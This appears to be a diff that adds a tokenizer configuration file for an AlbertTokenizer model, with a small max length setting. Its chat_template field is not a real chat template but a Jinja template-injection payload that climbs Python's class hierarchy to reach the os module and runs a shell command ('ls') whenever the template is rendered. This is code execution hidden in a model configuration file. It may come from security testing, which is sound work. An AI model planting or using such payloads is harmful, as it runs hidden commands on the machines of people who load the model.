@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "AlbertTokenizer",
+  "chat_template": "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen(\"ls\").read() }}{% endif %}{% endfor %}",
+  "model_max_length": 1024
+}
